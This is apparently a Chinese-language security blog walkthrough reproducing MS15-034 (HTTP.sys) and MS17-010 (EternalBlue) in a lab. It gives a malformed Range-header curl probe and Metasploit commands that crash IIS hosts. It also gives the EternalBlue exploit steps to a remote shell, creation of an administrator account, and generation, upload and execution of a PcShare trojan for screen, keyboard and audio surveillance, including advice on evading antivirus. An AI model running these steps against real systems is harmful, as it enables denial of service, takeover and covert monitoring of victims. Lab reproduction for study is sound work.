> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk3NTEyMzQzOA==&mid=2247486300&idx=1&sn=324b5ac4e2c2f68d68f44eadbf206fc7

#  漏洞复现：CVE-2015-1635、CVE-2017-0144  
原创 Cauchy  Cauchy网安   2025-06-15 16:03  
  
# CVE-2015-1635-HTTP.SYS 远程执行代码漏洞  
  
在 2015 年 4 月安全补丁日，微软发布的众多安全更新中，修复了 HTTP.sys 中一处允许远程执行代码漏洞，编号为：CVE-2015-1635（MS15-034 ）。  

```
漏洞编号：CVE-2015-1635
微软通告：MS15-034
漏洞组件：HTTP.sys
影响系统：
Windows 7/8
Windows Server 2008 R2
Windows Server 2012 / R2（默认开启 IIS）
漏洞影响：
拒绝服务（DoS）— 立即蓝屏
潜在远程代码执行（复杂但存在）

```

  
攻击者可通过向启用IIS的服务器发送特制的**Range**  
请求，造成系统崩溃甚至远程执行代码，无需认证即可发起攻击。微软已通过KB3042553补丁修复此漏洞。  
# 环境准备（Win2008 R2 + IIS + kali）  
## 安装系统与配置 IIS  
### 安装 Windows Server 2008 R2（未打补丁）  
  
两台机器在同一网络（可通信）。可以互相ping通  
### 安装 IIS 服务（默认开启 HTTP.sys）  

```
服务器管理器 → 角色 → 添加角色 → Web Server（IIS）

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWB4j17JWEwMKnwtg345lMYlDjbPPaB2MTYbI9ms1J0X51micUMlpwCh1g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBOn3GUfJfMfvGMiaOfO89xe68kDUHBOOeXVjRic23dbHHyoHpl71eEGlg/640?wx_fmt=png&from=appmsg "")  
## 查看系统版本(PowerShell 或 CMD 查看版本)  

```
(Get-Item &#34;C:\Windows\System32\drivers\HTTP.sys&#34;).VersionInfo | Format-List

```

  
6.1.7601.18798 或更高，表示已修复  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBObzL3htyl6UjjOYrafzZQKdYuYpasz7icRibOiaejpltw9vyEnAJ3VrhA/640?wx_fmt=png&from=appmsg "")  
版本为：6.1.7600.16385,所以存在该漏洞。  
# msf漏洞利用  
## kali返回数据包判断是否存在ms15_034  

```
curl -v 192.168.2.153 -H &#34;Host:irrelevant&#34; -H &#34;Range:bytes=0-18446744073709551615&#34;


```

  
<table><thead><tr><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">部分</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">含义</span></section></th></tr></thead><tbody><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">curl</span></code></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">使用 curl 工具发起一个 HTTP 请求</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">-v</span></code></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">启用 verbose 模式（详细模式），显示请求和响应的头信息，便于调试</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">192.168.2.153</span></code></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">目标 IP 地址，默认端口是 80（HTTP）</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">-H &#34;Host:irrelevant&#34;</span></code></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">添加 HTTP 头部，伪造 Host 字段为 &#34;irrelevant&#34;（此值不影响漏洞触发）</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">-H &#34;Range:bytes=0-18446744073709551615&#34;</span></code></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><font mstmutation="1" msttexthash="649226812" msthash="41308"><span leaf="">关键部分：构造 </span><strong mstmutation="1" style="color: rgb(53, 148, 247);font-weight: bold;background-attachment: scroll;background-clip: border-box;background-color: rgba(0, 0, 0, 0);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;margin-top: 0px;margin-bottom: 0px;margin-left: 0px;margin-right: 0px;padding-top: 0px;padding-bottom: 0px;padding-left: 0px;padding-right: 0px;border-top-style: none;border-bottom-style: none;border-left-style: none;border-right-style: none;border-top-width: 3px;border-bottom-width: 3px;border-left-width: 3px;border-right-width: 3px;border-top-color: rgba(0, 0, 0, 0.4);border-bottom-color: rgba(0, 0, 0, 0.4);border-left-color: rgba(0, 0, 0, 0.4);border-right-color: rgba(0, 0, 0, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><span leaf="">异常范围请求</span></strong><span leaf="">，试图从第 0 字节读到  字节，这是远超正常范围的非法请求，会触发 HTTP.sys 的整数溢出漏洞</span></font><code><span leaf="">2^64 - 1</span></code></td></tr></tbody></table>  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWB2ZbA2ficnT5XuEAPcdohWNCjBt6WedPvF1bLImAgYKiaPNkVnWY5FY5Q/640?wx_fmt=png&from=appmsg "")  
如果出现416和Requested Range Not Satisfiable，则证明存在漏洞，反之，则不存在  
## msf寻找漏洞  
### 搜索模块  

```
msfconsole
msf6>search MS15-034

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBm20LRWr8CjTRKnFd2WxqhIpfXPfzIbpD6fm8kpGNE5xic0Py6bMGlicw/640?wx_fmt=png&from=appmsg "")  
  
发现该漏洞有可利用的模块，  
### 选择payload模块  
  
选择payload模块，带有sanner的是验证模块，带有dos的是攻击模块：，  在 kali 系统，借助 metasploit 平台利用 ms15-034 漏洞读取服务器内存数据，这是获取内存信息的工具
```
use 1
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBxfBaXNLxGwula1DRibxjjEOW4zeR55J8VWZqXySdAPIicvVzNCmibGDicg/640?wx_fmt=png&from=appmsg "")  
  
#### 设置目标IP  
  
看一下这个模块需要配置什么  

```
show options

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWB3gj0nLfu0bHdLoGwVh4ziaDYDF9xib0eiaWzvvwM5bhXFB3I4jjfkArbQ/640?wx_fmt=png&from=appmsg "")  
发现我们只需要设置目标ip就可以啦  

```
set rhosts 目标ip

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBlYfmcoJyibgvbnBUhc7FhcKagJfCSpt8N8S3eT07EeATWOl9f4kkbHA/640?wx_fmt=png&from=appmsg "")  
#### 开始读取内存信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBiaYKlE31yZV7RpIfvicxQJxC56kYJ6iaOKsoxOMpibAtynbriaDfx2ggS2Q/640?wx_fmt=png&from=appmsg "")  
但它在大多数环境下并不能真正实现“读取任意内存”的效果  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBcCwFYRx7oJRc43bhncny73liaqDjZJLk7yR9pociaG57w5tG1d18lF0w/640?wx_fmt=png&from=appmsg "")  
  
### dos攻击模块  
  
利用 ms15-034 漏洞进行 ddos 攻击,同样借助 metasploit 平台  

```
msf6>use auxiliary/dos/http/ms15_034_ulonglongadd
Msf6 auxiliary > set rhosts 目标ip
Msf6 auxiliary >   set  threads 10    (把攻击线程数设置成 10 个)
Threads => 10
Msf6 auxiliary > run

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBpUQzbWZo2ySowHKoUQA7PffSVocs0aNjsQ7nu4EAOGb5ujTcbrwAVw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBTw58YMibP8ggoIcZRlTyLG3hFwFQb7ticCcGm3xN8bHqWkic6SWTaMpnw/640?wx_fmt=png&from=appmsg "")  
  
攻击开始后，win7 或 win2008 瞬间蓝屏然后自动重启(win7 肯定蓝屏重启，win2008 有时不成功，不蓝屏)，截图如下，win2008已经自动重启了：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBMBD5s8ASDzBZjeo5QmxRb03JIIKD0fv5As2rknsGKbQ7PZy6SySibnQ/640?wx_fmt=png&from=appmsg "")  
  
  
再run攻击一次就开始蓝屏  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBWsOQm6ibJlGw6ZviawfDVOUPyVnhGYicfDg6MaZSSIkuyBiaLMoqM3HKwg/640?wx_fmt=png&from=appmsg "")  
漏洞修复,打补丁，微软官方网站有提供的，这是最可靠的方式，或者执行如下动作：禁用 IIS 内核缓存（可能 会降低 IIS 性能）  
# CVE-2017-0144（MS17-010）网络服务器攻击  
  
MS17-010 是一个严重的 Windows 漏洞，影响包括 Windows Server 2008 在内的多个版本，允许远程执行代码。它在 2017 年被披露，并被广泛用于“永恒之蓝”（EternalBlue）攻击  

```
CVE名称：CVE-2017-0144
公开时间：2017年3月14日（MS17-010 公告发布）
影响系统：
Windows Vista / 7 / 8 / 10
Windows Server 2008 / 2012 / 2016
漏洞类型：SMBv1 远程代码执行（RCE）
利用方式：无需认证、可远程利用、使用端口 445（SMB）

```


```
nmap -p445 --script smb-vuln-ms17-010 192.168.2.153

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBZ2Fm3xCqcOSHTPvNRZXo0rHew8UexLCjThQXtaeUhTphzyWib708ibTw/640?wx_fmt=png&from=appmsg "")  
可以使用 EternalBlue（Metasploit）对该主机进行漏洞利用（获得 shell）。  
## 搜索漏洞可利用的模块  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBpZVHgm7GtEEVB3UUQJ39NUMtNZkuQj2wWmUPgFzzAy6oc8omxiaKlhA/640?wx_fmt=png&from=appmsg "")  
搜索出来好几个 ms17-010，到底哪个是攻击漏洞，我们要根据提示信息和手动验证的方式来验证，一般 exploit 开头的都是直接渗透攻击的工具，也就是在这里面选。路径中的 smb 表示服务的意思  
## 选择模块  

```
use exploit/windows/smb/ms17_010_eternalblue 或者 use 0
info         //查看漏洞的信息

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBJeDFl7UK9JZ4QGwzOQU8sJu9hDL5r5Kw9nlfLxv58B2o1icoEYicF7hw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBciaoVVmMqBqESfqTEH49U1wcBZwNc7v8Iichic6NIBUyfgq2nuCqnkrvw/640?wx_fmt=png&from=appmsg "")  
## 查看攻击参数  
  

```
show options
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWB5c3BibnVLcNSDiaWW0JwgLcywqaQJpIrS8tOFAu21z3psuXPqCI5iarEw/640?wx_fmt=png&from=appmsg "")  
指定 RHOST（remote host 靶机）和 LHOST（操作 机）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBVeHN4T7SSwNzicdCndicCRuiayIiahaS7Qu6lRpDRHVQ182NN7Gw9eqe9w/640?wx_fmt=png&from=appmsg "")  
当我们找到并 use 这个 msf17-010 漏洞的时候，其实 msf 就帮你指定好了这个木马，不需要我们再自己 set 了，所以这个指令不需要执行。记得关闭目标主机的防火墙，或者给防火墙添加一些端口出入规则，不然攻击可能会失败。并且查看一下是否打了最新的补丁，如果打了最新的补丁，那也是攻击失败的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBibW3wecs2ZBAnHRglicujoxQwIXuzeWwqLd6tkBians1kcdu4WKfEdwibQ/640?wx_fmt=png&from=appmsg "")  
## 开始攻击  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWB3EEkUpMicasIMYkMFbrouCRLXcianAWa5Hqw2ve0njzyMbdySq2mtqbg/640?wx_fmt=png&from=appmsg "")  
## 得到shell  
  

```
shell
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWB0kNCFPbA1dUiaDNv67iakTmica2NVBCFvI65NGZoTctGA5R35phiaes9ug/640?wx_fmt=png&from=appmsg "")  
查看用户  

```
net user

```

  
发现中文乱码
```
chcp 65001
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBwApe40NGdWMoWOw7ZECCMwWGcsJbqeooVKHlvDQrzKvP74SasAKTbw/640?wx_fmt=png&from=appmsg "")  
  
## 创建用户  

```
net user

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBuNictRicK1Fia0pKa8T4CltbLNCNrOtOugcdSNzxVNnJdSN0IIvTKHuHg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBZtV1GQmhTKDMzWd14JHWicDJia7ND2TNGmiceYfsiaicuJhkHD9h1JMH7cg/640?wx_fmt=png&from=appmsg "")  
## 添加为管理员  

```
net localgroup administrators 22w4hyq /add


```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBWtAQO98rh0TicA2icbyqMK3icbpYQwVmkwHJXCAgq4icDqUoiakpefOfrEQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWB4Q4kaicVGCtpSFSCy0WIZY9nicxrRrXFkq6JBfYSiarMxOlRtt5jDFX1w/640?wx_fmt=png&from=appmsg "")  
## pcshare生成木马远程控制  
  
我们上传一个远程桌面控制木马程序，pcshare 双击打开 PcShare.exe，然后点击弹框中的取消按钮  点击生成客户  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBKEBc7ricGf4zNlukyNp3ThxdELZmocrHz20ODrRKM3voWMD0xQJ7icYg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBevdUcwiaZwxdDz272ThkibolYCGg1Q0ZBvJzawdGtUmwgYxWIrEryArQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBMqEmvEWBmufibgU8kGvouiaoib4B2wacM8B0KUpqkiaj58lnkSLGicA3J4g/640?wx_fmt=png&from=appmsg "")  
查看当前打开 pcshare 工具的主机，在物理机打开的，物理机的 ip 的地址要填写在上面的弹框中，表示将来的木马程序将目标主机的数据发送给当前物理机的 pcshare 工具上点击生成，会弹出如下窗口，它自动生成了一个木马程序，先保存下来，文件名称随便写。
```
注意，有可能被杀毒软件杀掉，因为是木马程序，所以要选择一个保存到一个设置了免杀的目录中去，比如 tools 文件夹（或这个时候关闭杀毒软件）。
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWB86RMcGFia2531IDZpth1IAmsVZ8tLb8uMicIUaOmhzB4zqLfN0YfJEzQ/640?wx_fmt=png&from=appmsg "")  
  
先退出shell
```
eixt
```

  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBKlS9mXJ1UpBmma6PXaK86amsfEASQo5qfIoH5zpR5TU1dHZWvGeIzQ/640?wx_fmt=png&from=appmsg "")  
  
接着将生成的 muma.exe 文件上传到 kali 主机上，比如上传到了/root 目录下面。最后将上传到 kali 上的 muma.exe 程序文件上传到目标主机上，上传到目标的 c 盘根目录中。  

```
upload /root/muma.exe C:

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWB2cVWRs9sdHUlVQn5Ra4jFrYCA3Dvia871VswtGXrXf7K0qA33PY20hQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBibC9nluN2c4v52BibVXVmiclVRxG9aU4HZ1icmMWiaEibmbmuvSkhgBpnniag/640?wx_fmt=png&from=appmsg "")  
接下来通过 kali 的 msf，远程执行一下这个文件，提示如下进程建立，表示运行成功了。  

```
execute -f c:\\muma.exe

```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBG9VE1Nz0zn4U0zHq4gib0Uibibjl3vrcy2otZtEYmwXaMLwm3zW25GT0w/640?wx_fmt=png&from=appmsg "")  
然后再去被攻击机看一下，这个文件运行成功之后，这个文件就消失了，其实是隐藏到某个驱动当中去了。然后看一下我们自己本机的 pcshare 工具窗口，等待一下之后，就看到有内容产生了。  
  

```
注意：一定要先关闭自己本机的防火墙，不然 muma.exe 程序没办法连接上你的 pcshare 工具。
```

  
  
这就拿到了目标主机的所有操作，这里我们可以进行屏幕监控、保存屏幕录像、文件管理、进程管理、键盘管控(这个功能没试过)、注册表管理、音视频监控、窗口管理等等  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBoQgmicia210VWciaSeUsBiayx7AibL0BVLg8uI8kRN69CgT9LicDluPAjZyg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBZYxyjDpaI11OGWaVfK6eAVKYKqL3TibibD39b9PmE1LhpPibVe4uGskLg/640?wx_fmt=png&from=appmsg "")  
## 成功上线  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWB6CyUtgYbSsic2Vc4w4hWTibLBCOibz5ibKbEanyJovKAz6VN5dwDuvHGGA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSfzHZQr6iaMz69YMCMPsAWBkpa83lbCEu4hHShIxxqay2cOlEhjFb8eUQtMJS4vylUchpjPbneYiaw/640?wx_fmt=png&from=appmsg "")  
  
  
  
